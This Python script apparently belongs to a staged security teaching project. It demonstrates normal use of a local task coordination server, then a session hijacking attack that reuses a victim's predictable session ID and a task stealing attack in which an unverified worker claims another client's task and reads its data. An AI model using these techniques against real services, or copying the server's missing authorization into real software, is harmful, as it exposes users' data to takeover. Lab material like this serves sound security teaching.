#!/usr/bin/env python3
"""
Task Collaboration System - Quick Test Script

This script demonstrates:
1. Basic system operation (normal use)
2. Session hijacking attack
3. Task stealing attack

⚠️  For Educational Purposes Only
"""

import socket
import json
import time
from typing import Dict, Any


def send_message(sock: socket.socket, message: Dict[str, Any]):
    """Send a JSON message"""
    message_json = json.dumps(message)
    message_bytes = message_json.encode() + b'\n'
    sock.sendall(message_bytes)


def receive_message(sock: socket.socket) -> Dict[str, Any]:
    """Receive a JSON message"""
    buffer = b""
    while b'\n' not in buffer:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError("Connection closed")
        buffer += chunk
    
    message_json = buffer.split(b'\n')[0].decode()
    return json.loads(message_json)


def demo_normal_operation():
    """Demonstrate normal system operation"""
    print("\n" + "="*60)
    print("DEMO 1: Normal Operation")
    print("="*60)
    
    # Connect as legitimate client
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("localhost", 9000))
    
    # Handshake
    print("\n[1] Performing handshake...")
    send_message(sock, {
        "type": "handshake",
        "client_id": "test-client-001",
        "client_type": "client",
        "protocol_version": "1.0"
    })
    response = receive_message(sock)
    session_id = response["session_id"]
    print(f"✅ Session ID: {session_id}")
    
    # Create a project
    print("\n[2] Creating a project...")
    send_message(sock, {
        "type": "create_project",
        "session_id": session_id,
        "payload": {
            "project_name": "Data Analysis Project",
            "description": "Analyze customer data",
            "owner": "test-client-001"
        }
    })
    response = receive_message(sock)
    project_id = response["project"]["project_id"]
    print(f"✅ Project created: {project_id}")
    
    # Create a task
    print("\n[3] Creating a task...")
    send_message(sock, {
        "type": "create_task",
        "session_id": session_id,
        "payload": {
            "project_id": project_id,
            "task_type": "data_analysis",
            "description": "Analyze sales data for Q4",
            "priority": "high",
            "data": {
                "dataset": ["record1", "record2", "record3"],
                "analysis_type": "summary"
            }
        }
    })
    response = receive_message(sock)
    task_id = response["task"]["task_id"]
    print(f"✅ Task created: {task_id}")
    
    # List projects
    print("\n[4] Listing projects...")
    send_message(sock, {
        "type": "list_projects",
        "session_id": session_id,
        "payload": {}
    })
    response = receive_message(sock)
    print(f"✅ Found {len(response['projects'])} project(s)")
    
    sock.close()
    print("\n✅ Normal operation complete!")


def demo_session_hijacking():
    """Demonstrate session hijacking attack"""
    print("\n" + "="*60)
    print("DEMO 2: Session Hijacking Attack")
    print("="*60)
    print("\n⚠️  This demonstrates how an attacker can hijack a session")
    
    # Step 1: Legitimate user creates session
    print("\n[Step 1] Legitimate user connects...")
    sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock1.connect(("localhost", 9000))
    
    send_message(sock1, {
        "type": "handshake",
        "client_id": "victim-client",
        "client_type": "client",
        "protocol_version": "1.0"
    })
    response = receive_message(sock1)
    victim_session_id = response["session_id"]
    print(f"✅ Victim's session ID: {victim_session_id}")
    
    # Create a project
    send_message(sock1, {
        "type": "create_project",
        "session_id": victim_session_id,
        "payload": {
            "project_name": "Secret Project",
            "description": "Confidential data",
            "owner": "victim-client"
        }
    })
    response = receive_message(sock1)
    project_id = response["project"]["project_id"]
    print(f"✅ Victim created project: {project_id}")
    
    # Step 2: Attacker guesses session ID
    print("\n[Step 2] Attacker attempts hijacking...")
    print(f"⚠️  Attacker observes session ID pattern: session-XXXX")
    print(f"⚠️  Attacker guesses victim's session: {victim_session_id}")
    
    # Attacker connects with stolen session
    sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock2.connect(("localhost", 9000))
    
    # Attacker uses victim's session ID (no handshake needed!)
    print("\n[Step 3] Attacker uses stolen session ID...")
    send_message(sock2, {
        "type": "list_projects",
        "session_id": victim_session_id,  # ❌ Using stolen session!
        "payload": {}
    })
    response = receive_message(sock2)
    
    if response["status"] == "success":
        print("🚨 ATTACK SUCCESSFUL!")
        print(f"   Attacker can see victim's projects: {len(response['projects'])} project(s)")
        print("   ❌ No session validation!")
        print("   ❌ No binding to client identity!")
    
    # Attacker can even modify the project
    print("\n[Step 4] Attacker modifies victim's project...")
    send_message(sock2, {
        "type": "create_task",
        "session_id": victim_session_id,
        "payload": {
            "project_id": project_id,
            "task_type": "data_analysis",
            "description": "Malicious task injected by attacker!",
            "priority": "high",
            "data": {"evil": "payload"}
        }
    })
    response = receive_message(sock2)
    
    if response["status"] == "success":
        print("🚨 ATTACK SUCCESSFUL!")
        print("   Attacker created malicious task in victim's project!")
    
    sock1.close()
    sock2.close()
    print("\n⚠️  Session hijacking demonstration complete!")


def demo_task_stealing():
    """Demonstrate task stealing attack"""
    print("\n" + "="*60)
    print("DEMO 3: Task Stealing Attack")
    print("="*60)
    print("\n⚠️  This demonstrates how workers can steal tasks")
    
    # Create a legitimate task
    print("\n[Step 1] Client creates a task...")
    sock_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock_client.connect(("localhost", 9000))
    
    send_message(sock_client, {
        "type": "handshake",
        "client_id": "client-001",
        "client_type": "client",
        "protocol_version": "1.0"
    })
    response = receive_message(sock_client)
    client_session = response["session_id"]
    
    # Create project and task
    send_message(sock_client, {
        "type": "create_project",
        "session_id": client_session,
        "payload": {
            "project_name": "Important Project",
            "description": "Critical business task",
            "owner": "client-001"
        }
    })
    response = receive_message(sock_client)
    project_id = response["project"]["project_id"]
    
    send_message(sock_client, {
        "type": "create_task",
        "session_id": client_session,
        "payload": {
            "project_id": project_id,
            "task_type": "data_analysis",
            "description": "Analyze sensitive financial data",
            "priority": "high",
            "data": {"sensitive": "financial_data"}
        }
    })
    response = receive_message(sock_client)
    task_id = response["task"]["task_id"]
    print(f"✅ Task created: {task_id}")
    
    # Malicious worker connects
    print("\n[Step 2] Malicious worker connects...")
    sock_worker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock_worker.connect(("localhost", 9000))
    
    send_message(sock_worker, {
        "type": "handshake",
        "client_id": "malicious-worker",
        "client_type": "worker",
        "protocol_version": "1.0"
    })
    response = receive_message(sock_worker)
    worker_session = response["session_id"]
    
    # Register with false capabilities
    print("\n[Step 3] Malicious worker registers with false capabilities...")
    send_message(sock_worker, {
        "type": "register_worker",
        "session_id": worker_session,
        "payload": {
            "worker_id": "malicious-worker",
            "capabilities": ["data_analysis"]  # ❌ Claim to have capability
        }
    })
    response = receive_message(sock_worker)
    print("✅ Worker registered (no verification!)")
    
    # Steal the task
    print("\n[Step 4] Malicious worker steals the task...")
    send_message(sock_worker, {
        "type": "claim_task",
        "session_id": worker_session,
        "payload": {
            "task_id": task_id,  # ❌ Can claim any task!
            "worker_id": "malicious-worker"
        }
    })
    response = receive_message(sock_worker)
    
    if response["status"] == "success":
        print("🚨 ATTACK SUCCESSFUL!")
        print("   Malicious worker stole the task!")
        print("   ❌ No authorization check!")
        print("   ❌ No verification of worker identity!")
        print(f"   Task data exposed: {response['task'].get('data')}")
    
    sock_client.close()
    sock_worker.close()
    print("\n⚠️  Task stealing demonstration complete!")


def main():
    """Run all demonstrations"""
    print("╔═══════════════════════════════════════════════════╗")
    print("║  Task Collaboration - Security Demo               ║")
    print("║  ⚠️  Educational Purposes Only                    ║")
    print("╚═══════════════════════════════════════════════════╝")
    print()
    print("This script demonstrates:")
    print("1. Normal system operation")
    print("2. Session hijacking attack")
    print("3. Task stealing attack")
    print()
    print("⚠️  Make sure the coordinator is running first!")
    print("   python server/task_coordinator.py")
    print()
    
    input("Press Enter to start demonstrations...")
    
    try:
        # Demo 1: Normal operation
        demo_normal_operation()
        time.sleep(2)
        
        # Demo 2: Session hijacking
        demo_session_hijacking()
        time.sleep(2)
        
        # Demo 3: Task stealing
        demo_task_stealing()
        
        print("\n" + "="*60)
        print("All demonstrations complete!")
        print("="*60)
        print()
        print("📚 What you learned:")
        print("   ✅ How the system works normally")
        print("   ❌ Session IDs are predictable and can be hijacked")
        print("   ❌ No session binding to client identity")
        print("   ❌ No authorization checks on tasks")
        print("   ❌ Workers can claim false capabilities")
        print()
        print("📖 Next steps:")
        print("   1. Read SECURITY_ANALYSIS.md for detailed vulnerability analysis")
        print("   2. Try the interactive client: python client/client.py")
        print("   3. Move to Stage 2 to see improvements")
        print()
        
    except ConnectionRefusedError:
        print("\n❌ Error: Could not connect to coordinator")
        print("   Make sure it's running: python server/task_coordinator.py")
    except KeyboardInterrupt:
        print("\n\n🛑 Demonstrations interrupted")
    except Exception as e:
        print(f"\n❌ Error: {e}")


if __name__ == "__main__":
    main()